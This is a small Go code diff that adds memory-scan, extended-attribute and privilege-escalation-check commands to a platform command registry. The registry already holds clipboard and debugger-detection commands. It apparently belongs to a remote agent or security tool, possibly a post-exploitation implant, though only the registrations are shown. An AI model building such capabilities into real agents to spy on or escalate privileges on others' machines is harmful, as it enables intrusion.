@@ -14,4 +14,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&ClipboardCommand{})
 	RegisterCommand(&DrivesUnixCommand{})
 	RegisterCommand(&DebugDetectCommand{})
+	RegisterCommand(&XattrCommand{})
+	RegisterCommand(&MemScanCommand{})
+	RegisterCommand(&PrivescCheckCommand{})
 }
